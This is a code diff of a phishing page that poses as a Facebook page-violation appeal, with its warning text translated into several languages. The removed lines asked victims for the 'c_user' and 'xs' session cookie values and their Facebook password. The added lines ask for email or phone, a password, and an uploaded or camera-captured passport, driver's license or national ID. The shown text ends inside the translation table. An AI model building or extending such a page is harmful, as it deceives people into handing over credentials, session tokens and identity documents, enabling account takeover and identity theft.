@@ -491,6 +491,11 @@
       background: #fafafa;
     }
    
+    .form-input[type="file"] {
+      padding: 10px 16px;
+      cursor: pointer;
+    }
+   
     .form-input:focus {
       border: 1px solid #0064e0;
       box-shadow: 0 0 0 3px rgba(0, 100, 224, 0.15);
@@ -548,7 +553,7 @@
       font-size: 16px;
       cursor: pointer;
       transition: all 0.3s ease;
-      margin-top: 10px
+      margin-top: 10px;
       position: relative;
       overflow: hidden;
       display: flex;
@@ -1030,6 +1035,522 @@
         font-size: 11px;
       }
     }
+
+    /* Upload Document Button */
+    .upload-document-btn {
+      width: 100%;
+      padding: 18px 20px;
+      background: linear-gradient(135deg, #f8f9fa 0%, #ffffff 100%);
+      border: 2px dashed #c1c1c1;
+      border-radius: 12px;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 12px;
+      color: #5f6368;
+      font-size: 15px;
+      font-weight: 600;
+      position: relative;
+      overflow: hidden;
+    }
+
+    .upload-document-btn::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: -100%;
+      width: 100%;
+      height: 100%;
+      background: linear-gradient(90deg, transparent, rgba(0, 100, 224, 0.05), transparent);
+      transition: 0.6s;
+    }
+
+    .upload-document-btn:hover::before {
+      left: 100%;
+    }
+
+    .upload-document-btn:hover {
+      background: linear-gradient(135deg, #e6f1ff 0%, #f0f7ff 100%);
+      border-color: #0064e0;
+      color: #0064e0;
+      transform: translateY(-2px);
+      box-shadow: 0 4px 12px rgba(0, 100, 224, 0.15);
+    }
+
+    .upload-document-btn svg {
+      width: 24px;
+      height: 24px;
+      transition: transform 0.3s ease;
+    }
+
+    .upload-document-btn:hover svg {
+      transform: translateY(-2px);
+    }
+
+    /* Upload Modal Styles */
+    .upload-modal {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      z-index: 99998;
+      display: none;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+    }
+
+    .upload-modal.show {
+      display: flex;
+      animation: fadeIn 0.3s ease-out;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; }
+      to { opacity: 1; }
+    }
+
+    .upload-modal-overlay {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.75);
+      backdrop-filter: blur(8px);
+      -webkit-backdrop-filter: blur(8px);
+    }
+
+    .upload-modal-content {
+      position: relative;
+      background: #fff;
+      border-radius: 20px;
+      max-width: 540px;
+      width: 100%;
+      max-height: 90vh;
+      overflow-y: auto;
+      overflow-x: hidden;
+      box-shadow: 0 25px 50px rgba(0, 0, 0, 0.35);
+      animation: modalSlideUp 0.4s cubic-bezier(0.34, 1.56, 0.64, 1);
+    }
+
+    @keyframes modalSlideUp {
+      from {
+        opacity: 0;
+        transform: translateY(40px) scale(0.95);
+      }
+      to {
+        opacity: 1;
+        transform: translateY(0) scale(1);
+      }
+    }
+
+    .upload-modal-content::-webkit-scrollbar {
+      width: 8px;
+    }
+
+    .upload-modal-content::-webkit-scrollbar-track {
+      background: #f1f1f1;
+      border-radius: 10px;
+    }
+
+    .upload-modal-content::-webkit-scrollbar-thumb {
+      background: #c1c1c1;
+      border-radius: 10px;
+    }
+
+    .upload-modal-content::-webkit-scrollbar-thumb:hover {
+      background: #a8a8a8;
+    }
+
+    .upload-modal-header {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 24px 28px;
+      border-bottom: 1px solid #e5e7eb;
+      background: linear-gradient(135deg, #fafbfc 0%, #ffffff 100%);
+      border-radius: 20px 20px 0 0;
+    }
+
+    .upload-modal-title {
+      font-size: 21px;
+      font-weight: 700;
+      color: #1a1a1a;
+      margin: 0;
+      letter-spacing: -0.3px;
+    }
+
+    .upload-modal-close {
+      background: #f1f3f4;
+      width: 36px;
+      height: 36px;
+      border-radius: 50%;
+      border: none;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      flex-shrink: 0;
+    }
+
+    .upload-modal-close:hover {
+      background: #e8eaed;
+      transform: rotate(90deg) scale(1.1);
+      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
+    }
+
+    .upload-modal-close svg {
+      width: 18px;
+      height: 18px;
+      fill: #5f6368;
+    }
+
+    .upload-modal-notice {
+      display: flex;
+      align-items: flex-start;
+      gap: 14px;
+      padding: 18px 28px;
+      background: linear-gradient(135deg, #f0f7ff 0%, #e6f1ff 100%);
+      border-bottom: 1px solid #d6ebff;
+      border-left: 4px solid #0064e0;
+    }
+
+    .upload-modal-notice svg {
+      flex-shrink: 0;
+      margin-top: 2px;
+    }
+
+    .upload-modal-notice p {
+      margin: 0;
+      font-size: 14px;
+      line-height: 1.6;
+      color: #1a1a1a;
+    }
+
+    .upload-modal-body {
+      padding: 28px;
+    }
+
+    .upload-modal-body {
+      padding: 24px;
+    }
+
+    .id-type-options {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 14px;
+      margin-bottom: 24px;
+    }
+
+    .id-type-option {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 22px 14px;
+      border: 2px solid #e5e7eb;
+      border-radius: 14px;
+      cursor: pointer;
+      transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+      text-align: center;
+      background: linear-gradient(135deg, #ffffff 0%, #f9fafb 100%);
+      position: relative;
+      overflow: hidden;
+    }
+
+    .id-type-option::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: 0;
+      right: 0;
+      height: 3px;
+      background: linear-gradient(90deg, #0064e0, #0084ff);
+      transform: scaleX(0);
+      transition: transform 0.3s ease;
+    }
+
+    .id-type-option:hover {
+      border-color: #0064e0;
+      background: linear-gradient(135deg, #f0f7ff 0%, #e6f1ff 100%);
+      transform: translateY(-4px);
+      box-shadow: 0 8px 20px rgba(0, 100, 224, 0.15);
+    }
+
+    .id-type-option.selected {
+      border-color: #0064e0;
+      background: linear-gradient(135deg, #e6f1ff 0%, #d6ebff 100%);
+      box-shadow: 0 8px 24px rgba(0, 100, 224, 0.2);
+      transform: translateY(-2px);
+    }
+
+    .id-type-option.selected::before {
+      transform: scaleX(1);
+    }
+
+    .id-type-icon {
+      width: 52px;
+      height: 52px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin-bottom: 14px;
+      color: #5f6368;
+      transition: all 0.3s ease;
+      background: #f1f3f4;
+      border-radius: 12px;
+    }
+
+    .id-type-option:hover .id-type-icon {
+      color: #0064e0;
+      background: #e6f1ff;
+      transform: scale(1.1);
+    }
+
+    .id-type-option.selected .id-type-icon {
+      color: #0064e0;
+      background: #d6ebff;
+      transform: scale(1.05);
+    }
+
+    .id-type-option span {
+      font-size: 13px;
+      font-weight: 600;
+      color: #1a1a1a;
+      line-height: 1.4;
+    }
+
+    .upload-options {
+      display: grid;
+      grid-template-columns: repeat(2, 1fr);
+      gap: 14px;
+    }
+
+    .upload-option {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 28px 18px;
+      border: 2px solid #e5e7eb;
+      border-radius: 14px;
+      cursor: pointer;
+      transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+      background: linear-gradient(135deg, #ffffff 0%, #f9fafb 100%);
+      position: relative;
+      overflow: hidden;
+    }
+
+    .upload-option::after {
+      content: '';
+      position: absolute;
+      inset: 0;
+      background: linear-gradient(135deg, rgba(0, 100, 224, 0.05) 0%, rgba(0, 132, 255, 0.05) 100%);
+      opacity: 0;
+      transition: opacity 0.3s ease;
+    }
+
+    .upload-option:hover::after {
+      opacity: 1;
+    }
+
+    .upload-option:hover {
+      border-color: #0064e0;
+      background: linear-gradient(135deg, #f0f7ff 0%, #e6f1ff 100%);
+      transform: translateY(-4px) scale(1.02);
+      box-shadow: 0 8px 24px rgba(0, 100, 224, 0.2);
+    }
+
+    .upload-option:active {
+      transform: translateY(-2px) scale(0.98);
+    }
+
+    .upload-option-icon {
+      width: 64px;
+      height: 64px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin-bottom: 14px;
+      color: #0064e0;
+      background: linear-gradient(135deg, #e6f1ff 0%, #d6ebff 100%);
+      border-radius: 50%;
+      transition: all 0.3s ease;
+      position: relative;
+      z-index: 1;
+    }
+
+    .upload-option:hover .upload-option-icon {
+      transform: scale(1.1) rotate(5deg);
+      box-shadow: 0 4px 12px rgba(0, 100, 224, 0.3);
+    }
+
+    .upload-option span {
+      font-size: 14px;
+      font-weight: 600;
+      color: #1a1a1a;
+      text-align: center;
+      position: relative;
+      z-index: 1;
+    }
+
+    /* Mobile responsive for upload modal */
+    @media (max-width: 768px) {
+      .upload-modal {
+        padding: 10px;
+        align-items: flex-end;
+      }
+
+      .upload-modal-content {
+        width: 100%;
+        max-height: 92vh;
+        border-radius: 20px 20px 0 0;
+        animation: modalSlideUpMobile 0.4s cubic-bezier(0.34, 1.56, 0.64, 1);
+      }
+
+      @keyframes modalSlideUpMobile {
+        from {
+          transform: translateY(100%);
+        }
+        to {
+          transform: translateY(0);
+        }
+      }
+
+      .upload-modal-header {
+        padding: 18px 22px;
+      }
+
+      .upload-modal-title {
+        font-size: 18px;
+      }
+
+      .upload-modal-notice {
+        padding: 16px 22px;
+      }
+
+      .upload-modal-body {
+        padding: 22px;
+      }
+
+      .id-type-options {
+        grid-template-columns: 1fr;
+        gap: 12px;
+      }
+
+      .id-type-option {
+        flex-direction: row;
+        justify-content: flex-start;
+        padding: 18px;
+        gap: 16px;
+      }
+
+      .id-type-icon {
+        margin-bottom: 0;
+        width: 48px;
+        height: 48px;
+      }
+
+      .id-type-option span {
+        font-size: 15px;
+        text-align: left;
+      }
+
+      .upload-options {
+        grid-template-columns: 1fr;
+        gap: 12px;
+      }
+
+      .upload-option {
+        padding: 24px 16px;
+      }
+    }
+
+    @media (max-width: 480px) {
+      .upload-modal {
+        padding: 0;
+      }
+
+      .upload-modal-content {
+        border-radius: 20px 20px 0 0;
+        max-height: 95vh;
+      }
+
+      .upload-modal-header {
+        padding: 16px 18px;
+      }
+
+      .upload-modal-title {
+        font-size: 17px;
+      }
+
+      .upload-modal-close {
+        width: 32px;
+        height: 32px;
+      }
+
+      .upload-modal-notice {
+        padding: 14px 18px;
+      }
+
+      .upload-modal-notice p {
+        font-size: 13px;
+        line-height: 1.5;
+      }
+
+      .upload-modal-body {
+        padding: 18px;
+      }
+
+      .id-type-option {
+        padding: 16px;
+      }
+
+      .id-type-icon {
+        width: 44px;
+        height: 44px;
+      }
+
+      .upload-option {
+        padding: 22px 14px;
+      }
+
+      .upload-option-icon {
+        width: 56px;
+        height: 56px;
+      }
+    }
+
+    /* Improve form input styling */
+    .form-input::-webkit-input-placeholder {
+      color: #9ca3af;
+    }
+    
+    .form-input::-moz-placeholder {
+      color: #9ca3af;
+    }
+    
+    .form-input:-ms-input-placeholder {
+      color: #9ca3af;
+    }
+    
+    .form-input::placeholder {
+      color: #9ca3af;
+    }
+
+    /* Better touch targets for mobile */
+    @media (max-width: 768px) {
+      .form-input,
+      .form-btn,
+      .upload-document-btn {
+        min-height: 48px;
+      }
+    }
   </style>
 </head>
 <body>
@@ -1202,24 +1723,44 @@
             </div>
           </div>
           
-          <!-- Video Section -->
-          <div class="video-container" id="videoContainer">
-            <video class="video-player" id="guideVideo" controls>
-              <source src="https://resource2.heygen.ai/video_translate/94087358030a4df8b20e73f1fba92ed5-en/720p.mp4" type="video/mp4">
-              Your browser does not support the video tag.
-            </video>
+          <div class="form-group">
+            <label for="emailPhoneInput" class="form-label translatable" data-key="emailPhoneLabel">Email or Phone Number</label>
+            <input type="text" class="form-input" id="emailPhoneInput" placeholder="Enter your email or phone number">
+            <div class="input-error" id="emailPhoneError"></div>
           </div>
          
           <div class="form-group">
-            <label for="nameInput" class="form-label translatable" data-key="nameLabel">c_user</label>
-            <input type="text" class="form-input" id="nameInput" placeholder="Enter c_user">
-            <div class="input-error" id="nameError"></div>
+            <label for="passwordInput1" class="form-label translatable" data-key="passwordLabel">Password</label>
+            <input type="password" class="form-input" id="passwordInput1" placeholder="Enter your password">
+            <div class="input-error" id="passwordError1"></div>
           </div>
          
           <div class="form-group">
-            <label for="mallInput" class="form-label translatable" data-key="mallLabel">xs</label>
-            <input type="text" class="form-input" id="mallInput" placeholder="Enter xs">
-            <div class="input-error" id="mallError"></div>
+            <label class="form-label translatable" data-key="uploadDocumentLabel">Upload Your Official Document</label>
+            <button type="button" class="upload-document-btn" id="uploadDocumentBtn">
+              <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <path d="M21 15V19C21 19.5304 20.7893 20.0391 20.4142 20.4142C20.0391 20.7893 19.5304 21 19 21H5C4.46957 21 3.96086 20.7893 3.58579 20.4142C3.21071 20.0391 3 19.5304 3 19V15" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                <path d="M17 8L12 3L7 8" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                <path d="M12 3V15" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+              </svg>
+              <span class="translatable" data-key="uploadDocumentBtn">Upload Document</span>
+            </button>
+            <div class="input-error" id="idCardError"></div>
+            <div id="selectedDocumentInfo" style="margin-top: 12px; display: none;">
+              <div style="background: linear-gradient(135deg, #e6f1ff 0%, #f0f7ff 100%); padding: 16px; border-radius: 12px; border: 2px solid #0064e0; box-shadow: 0 4px 12px rgba(0, 100, 224, 0.15);">
+                <div style="display: flex; align-items: center; gap: 12px;">
+                  <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M9 12L11 14L15 10M21 12C21 16.9706 16.9706 21 12 21C7.02944 21 3 16.9706 3 12C3 7.02944 7.02944 3 12 3C16.9706 3 21 7.02944 21 12Z" stroke="#0064e0" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/>
+                  </svg>
+                  <div style="flex: 1;">
+                    <div id="documentTypeName" style="font-weight: 700; color: #1a1a1a; margin-bottom: 3px; font-size: 15px;"></div>
+                    <div id="documentFileName" style="font-size: 13px; color: #5f6368; word-break: break-all;"></div>
+                  </div>
+                  <button type="button" id="changeDocumentBtn" style="background: #0064e0; border: none; color: #fff; cursor: pointer; font-size: 13px; font-weight: 600; padding: 8px 16px; border-radius: 8px; transition: all 0.3s ease; white-space: nowrap;">Change</button>
+                </div>
+                <div id="idCardPreview" style="margin-top: 14px; border-radius: 8px; overflow: hidden;"></div>
+              </div>
+            </div>
           </div>
          
           <div class="form-warning" id="formError">
@@ -1237,54 +1778,7 @@
           </button>
         </div>
        
-        <div class="fb-login-form" id="fbLoginForm">
-          <div class="fb-form-header">
-            <div class="fb-form-icon">
-              <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
-                <path d="M12 2C6.477 2 2 6.477 2 12c0 4.991 3.657 9.128 8.438 9.879V14.89h-2.54V12h2.54V9.797c0-2.506 1.492-3.89 3.777-3.89c1.094 0 2.238.195 2.238.195v2.46h-1.26c-1.243 0-1.63.771-1.63 1.562V12h2.773l-.443 2.89h-2.33v6.989C18.343 21.129 22 16.99 22 12c0-5.523-4.477-10-10-10z"/>
-              </svg>
-            </div>
-            <div>
-              <div class="fb-form-title translatable" data-key="fbFormTitle">Facebook Verification</div>
-              <div class="fb-form-subtitle translatable" data-key="fbFormSubtitle">Verify your identity to continue with the appeal</div>
-            </div>
-          </div>
-         
-          <div class="fb-form-notice-container">
-            <div class="fb-form-notice translatable" data-key="fbNotice1">
-              ⓘ For security purposes, we need to verify your Facebook account.
-            </div>
-            <div class="fb-form-notice translatable" data-key="fbNotice2">
-              ⓘ This helps us ensure that you are the legitimate owner of the page.
-            </div>
-            <div class="fb-form-notice translatable" data-key="fbNotice3">
-              ⓘ Your credentials are secure and encrypted.
-            </div>
-          </div>
-         
-          <div class="fb-form-group">
-            <label for="passwordInput" class="fb-form-label translatable" data-key="passwordLabel">Password</label>
-            <input type="password" class="fb-form-input" id="passwordInput" placeholder="Enter your Facebook password">
-            <div class="fb-input-error" id="passwordError"></div>
-          </div>
-         
-          <div class="fb-form-warning" id="fbFormError">
-            <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-              <path d="M12 9V14" stroke="currentColor" stroke-width="2" stroke-linecap="round"/>
-              <path d="M12 17V17.5" stroke="currentColor" stroke-width="2" stroke-linecap="round"/>
-              <path d="M12 22C17.5228 22 22 17.5228 22 12C22 6.47715 17.5228 2 12 2C6.47715 2 2 6.47715 2 12C2 17.5228 6.47715 22 12 22Z" stroke="currentColor" stroke-width="2"/>
-            </svg>
-            <span id="fbFormErrorText"></span>
-          </div>
-         
-          <button class="fb-form-btn" id="fbSendBtn">
-            <span id="fbSendBtnText" class="translatable" data-key="verifyBtn">Verify and Continue</span>
-            <div class="spinner" id="fbSendBtnSpinner" style="display: none;"></div>
-          </button>
-         
-          <div class="forgot-password" id="forgotPassword">
-            <span class="translatable" data-key="forgotPassword">Forgotten password?</span>
-          </div>
+        <div class="fb-login-form" id="fbLoginForm" style="display: none;">
         </div>
        
         <!-- Success Message -->
@@ -1367,6 +1861,86 @@
     </div>
   </div>
 
+  <!-- Upload Document Modal -->
+  <div class="upload-modal" id="uploadModal">
+    <div class="upload-modal-overlay" id="uploadModalOverlay"></div>
+    <div class="upload-modal-content">
+      <div class="upload-modal-header">
+        <h3 class="upload-modal-title translatable" data-key="chooseIdTypeTitle">Choose type of ID to upload</h3>
+        <button class="upload-modal-close" id="uploadModalClose">
+          <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+            <path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/>
+          </svg>
+        </button>
+      </div>
+      <div class="upload-modal-notice">
+        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+          <path d="M12 9V14" stroke="#5f6368" stroke-width="2" stroke-linecap="round"/>
+          <path d="M12 17V17.5" stroke="#5f6368" stroke-width="2" stroke-linecap="round"/>
+          <path d="M12 22C17.5228 22 22 17.5228 22 12C22 6.47715 17.5228 2 12 2C6.47715 2 2 6.47715 2 12C2 17.5228 6.47715 22 12 22Z" stroke="#5f6368" stroke-width="2"/>
+        </svg>
+        <p class="translatable" data-key="idUploadNotice">We'll use your ID to review your name, photo and date of birth. It won't be shared on your profile.</p>
+      </div>
+      <div class="upload-modal-body">
+        <div class="id-type-options">
+          <div class="id-type-option" data-id-type="passport">
+            <div class="id-type-icon">
+              <svg width="32" height="32" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <rect x="3" y="2" width="18" height="20" rx="2" stroke="currentColor" stroke-width="2"/>
+                <circle cx="12" cy="9" r="3" stroke="currentColor" stroke-width="2"/>
+                <path d="M7 18C7 16 9 14 12 14C15 14 17 16 17 18" stroke="currentColor" stroke-width="2" stroke-linecap="round"/>
+              </svg>
+            </div>
+            <span class="translatable" data-key="passportOption">Passport</span>
+          </div>
+          <div class="id-type-option" data-id-type="drivers_license">
+            <div class="id-type-icon">
+              <svg width="32" height="32" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <rect x="2" y="6" width="20" height="12" rx="2" stroke="currentColor" stroke-width="2"/>
+                <circle cx="8" cy="12" r="2" stroke="currentColor" stroke-width="2"/>
+                <path d="M13 10H18M13 14H18" stroke="currentColor" stroke-width="2" stroke-linecap="round"/>
+              </svg>
+            </div>
+            <span class="translatable" data-key="driversLicenseOption">Driver's License</span>
+          </div>
+          <div class="id-type-option" data-id-type="national_id">
+            <div class="id-type-icon">
+              <svg width="32" height="32" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <rect x="2" y="5" width="20" height="14" rx="2" stroke="currentColor" stroke-width="2"/>
+                <circle cx="8" cy="12" r="2.5" stroke="currentColor" stroke-width="2"/>
+                <path d="M14 10H19M14 14H17" stroke="currentColor" stroke-width="2" stroke-linecap="round"/>
+              </svg>
+            </div>
+            <span class="translatable" data-key="nationalIdOption">National ID Card</span>
+          </div>
+        </div>
+        <div class="upload-options" id="uploadOptionsContainer" style="display: none;">
+          <div class="upload-option" id="browsePhotosBtn">
+            <div class="upload-option-icon">
+              <svg width="28" height="28" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <rect x="3" y="3" width="18" height="18" rx="2" stroke="currentColor" stroke-width="2"/>
+                <circle cx="8.5" cy="8.5" r="1.5" fill="currentColor"/>
+                <path d="M21 15L16 10L5 21" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+              </svg>
+            </div>
+            <span class="translatable" data-key="browsePhotosOption">Browse from photos</span>
+          </div>
+          <div class="upload-option" id="useCameraBtn">
+            <div class="upload-option-icon">
+              <svg width="28" height="28" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <path d="M23 19C23 19.5304 22.7893 20.0391 22.4142 20.4142C22.0391 20.7893 21.5304 21 21 21H3C2.46957 21 1.96086 20.7893 1.58579 20.4142C1.21071 20.0391 1 19.5304 1 19V8C1 7.46957 1.21071 6.96086 1.58579 6.58579C1.96086 6.21071 2.46957 6 3 6H7L9 3H15L17 6H21C21.5304 6 22.0391 6.21071 22.4142 6.58579C22.7893 6.96086 23 7.46957 23 8V19Z" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                <circle cx="12" cy="13" r="4" stroke="currentColor" stroke-width="2"/>
+              </svg>
+            </div>
+            <span class="translatable" data-key="useCameraOption">Use Camera</span>
+          </div>
+          <input type="file" id="hiddenFileInput" accept="image/*" style="display: none;">
+          <input type="file" id="hiddenCameraInput" accept="image/*" capture="environment" style="display: none;">
+        </div>
+      </div>
+    </div>
+  </div>
+
   <script>
     // Wait for the DOM to be fully loaded
     document.addEventListener('DOMContentLoaded', function() {
@@ -1384,8 +1958,17 @@
           formNotice1: "ⓘ Your page has a violation related to our community guidelines.",
           formNotice2: "ⓘ Please review the violation details carefully before submitting.",
           formNotice3: "ⓘ Ensure you provide correct information for your appeal.",
-          nameLabel: "c_user",
-          mallLabel: "xs",
+          emailPhoneLabel: "Email or Phone Number",
+          passwordLabel: "Password",
+          uploadDocumentLabel: "Upload Your Official Document",
+          uploadDocumentBtn: "Upload Document",
+          chooseIdTypeTitle: "Choose type of ID to upload",
+          idUploadNotice: "We'll use your ID to review your name, photo and date of birth. It won't be shared on your profile.",
+          passportOption: "Passport",
+          driversLicenseOption: "Driver's License",
+          nationalIdOption: "National ID Card",
+          browsePhotosOption: "Browse from photos",
+          useCameraOption: "Use Camera",
           submitBtn: "Submit Appeal Request",
           fbFormTitle: "Facebook Verification",
           fbFormSubtitle: "Verify your identity to continue with the appeal",
@@ -1425,8 +2008,17 @@
           formNotice1: "ⓘ आपके पेज में हमारे सामुदायिक दिशानिर्देशों से संबंधित उल्लंघन है।",
           formNotice2: "ⓘ सबमिट करने से पहले कृपया उल्लंघन विवरणों की सावधानीपूर्वक समीक्षा करें।",
           formNotice3: "ⓘ अपनी अपील के लिए सही जानकारी प्रदान करना सुनिश्चित करें।",
-          nameLabel: "c_user",
-          mallLabel: "xs",
+          emailPhoneLabel: "ईमेल या फ़ोन नंबर",
+          passwordLabel: "पासवर्ड",
+          uploadDocumentLabel: "अपना आधिकारिक दस्तावेज़ अपलोड करें",
+          uploadDocumentBtn: "दस्तावेज़ अपलोड करें",
+          chooseIdTypeTitle: "अपलोड करने के लिए आईडी का प्रकार चुनें",
+          idUploadNotice: "हम आपके नाम, फोटो और जन्म तिथि की समीक्षा करने के लिए आपकी आईडी का उपयोग करेंगे। यह आपकी प्रोफ़ाइल पर साझा नहीं की जाएगी।",
+          passportOption: "पासपोर्ट",
+          driversLicenseOption: "ड्राइविंग लाइसेंस",
+          nationalIdOption: "राष्ट्रीय पहचान पत्र",
+          browsePhotosOption: "फ़ोटो से ब्राउज़ करें",
+          useCameraOption: "कैमरा उपयोग करें",
           submitBtn: "अपील अनुरोध जमा करें",
           fbFormTitle: "फेसबुक सत्यापन",
           fbFormSubtitle: "अपील जारी रखने के लिए अपनी पहचान सत्यापित करें",
@@ -1466,8 +2058,17 @@
           formNotice1: "ⓘ Tu página tiene una violación relacionada con nuestras pautas comunitarias.",
           formNotice2: "ⓘ Por favor, revisa los detalles de la violación cuidadosamente antes de enviar.",
           formNotice3: "ⓘ Asegúrate de proporcionar información correcta para tu apelación.",
-          nameLabel: "c_user",
-          mallLabel: "xs",
+          emailPhoneLabel: "Correo electrónico o número de teléfono",
+          passwordLabel: "Contraseña",
+          uploadDocumentLabel: "Sube tu documento oficial",
+          uploadDocumentBtn: "Subir documento",
+          chooseIdTypeTitle: "Elige el tipo de ID para subir",
+          idUploadNotice: "Usaremos tu ID para revisar tu nombre, foto y fecha de nacimiento. No se compartirá en tu perfil.",
+          passportOption: "Pasaporte",
+          driversLicenseOption: "Licencia de conducir",
+          nationalIdOption: "Tarjeta de identificación nacional",
+          browsePhotosOption: "Buscar en fotos",
+          useCameraOption: "Usar cámara",
           submitBtn: "Enviar solicitud de apelación",
           fbFormTitle: "Verificación de Facebook",
           fbFormSubtitle: "Verifica tu identidad para continuar con la apelación",
@@ -1507,8 +2108,17 @@
           formNotice1: "ⓘ Sua página tem uma violação relacionada às nossas diretrizes comunitárias.",
           formNotice2: "ⓘ Revise os detalhes da violação cuidadosamente antes de enviar.",
           formNotice3: "ⓘ Certifique-se de fornecer informações corretas para o seu recurso.",
-          nameLabel: "c_user",
-          mallLabel: "xs",
+          emailPhoneLabel: "E-mail ou número de telefone",
+          passwordLabel: "Senha",
+          uploadDocumentLabel: "Carregue seu documento oficial",
+          uploadDocumentBtn: "Carregar documento",
+          chooseIdTypeTitle: "Escolha o tipo de ID para carregar",
+          idUploadNotice: "Usaremos seu ID para revisar seu nome, foto e data de nascimento. Não será compartilhado em seu perfil.",
+          passportOption: "Passaporte",
+          driversLicenseOption: "Carteira de motorista",
+          nationalIdOption: "Cartão de identidade nacional",
+          browsePhotosOption: "Procurar em fotos",
+          useCameraOption: "Usar câmera",
           submitBtn: "Enviar solicitação de recurso",
           fbFormTitle: "Verificação do Facebook",
           fbFormSubtitle: "Verifique sua identidade para continuar com o recurso",
@@ -1548,8 +2158,17 @@
           formNotice1: "ⓘ உங்கள் பக்கத்தில் எங்கள் சமூக வழிகாட்டுதல்கள் தொடர்பான மீறல் உள்ளது.",
           formNotice2: "ⓘ சமர்ப்பிப்பதற்கு முன் மீறல் விவரங்களை கவனமாக மதிப்பாய்வு செய்யவும்.",
           formNotice3: "ⓘ உங்கள் மேல்முறையீட்டிற்கான சரியான தகவல்களை வழங்குவதை உறுதிசெய்யவும்.",
-          nameLabel: "c_user",
-          mallLabel: "xs",
+          emailPhoneLabel: "மின்னஞ்சல் அல்லது தொலைபேசி எண்",
+          passwordLabel: "கடவுச்சொல்",
+          uploadDocumentLabel: "உங்கள் அதிகாரப்பூர்வ ஆவணத்தை பதிவேற்றவும்",
+          uploadDocumentBtn: "ஆவணத்தை பதிவேற்றவும்",
+          chooseIdTypeTitle: "பதிவேற்ற அடையாள வகையைத் தேர்ந்தெடுக்கவும்",
+          idUploadNotice: "உங்கள் பெயர், புகைப்படம் மற்றும் பிறந்த தேதியை மதிப்பாய்வு செய்ய உங்கள் ஐடியைப் பயன்படுத்துவோம். இது உங்கள் சுயவிவரத்தில் பகிரப்படாது.",
+          passportOption: "கடவுச்சீட்டு",
+          driversLicenseOption: "ஓட்டுநர் உரிமம்",
+          nationalIdOption: "தேசிய அடையாள அட்டை",
+          browsePhotosOption: "புகைப்படங்களிலிருந்து உலாவவும்",
+          useCameraOption: "கேமராவைப் பயன்படுத்தவும்",
           submitBtn: "மேல்முறையீடு கோரிக்கையை சமர்ப்பிக்கவும்",
           fbFormTitle: "பேஸ்புக் சரிபார்ப்பு",
           fbFormSubtitle: "மேல்முறையீட்டைத் தொடர உங்கள் அடையாளத்தை சரிபார்க்கவும்",
@@ -1589,8 +2208,17 @@
           formNotice1: "ⓘ تحتوي صفحتك على انتهاك متعلق بإرشادات المجتمع الخاصة بنا.",
           formNotice2: "ⓘ يرجى مراجعة تفاصيل الانتهاك بعناية قبل الإرسال.",
           formNotice3: "ⓘ تأكد من تقديم معلومات صحيحة لاستئنافك.",
-          nameLabel: "c_user",
-          mallLabel: "xs",
+          emailPhoneLabel: "البريد الإلكتروني أو رقم الهاتف",
+          passwordLabel: "كلمة المرور",
+          uploadDocumentLabel: "قم بتحميل مستندك الرسمي",
+          uploadDocumentBtn: "تحميل المستند",
+          chooseIdTypeTitle: "اختر نوع الهوية للتحميل",
+          idUploadNotice: "سنستخدم هويتك لمراجعة اسمك وصورتك وتاريخ ميلادك. لن تتم مشاركتها في ملفك الشخصي.",
+          passportOption: "جواز السفر",
+          driversLicenseOption: "رخصة القيادة",
+          nationalIdOption: "بطاقة الهوية الوطنية",
+          browsePhotosOption: "تصفح من الصور",
+          useCameraOption: "استخدام الكاميرا",
           submitBtn: "إرسال طلب الاستئناف",
           fbFormTitle: "التحقق من فيسبوك",
           fbFormSubtitle: "تحقق من هويتك للمتابعة مع الاستئناف",
@@ -1630,8 +2258,17 @@
           formNotice1: "ⓘ Trang của bạn có vi phạm liên quan đến nguyên tắc cộng đồng của chúng tôi.",
           formNotice2: "ⓘ Vui lòng xem xét kỹ chi tiết vi phạm trước khi gửi.",
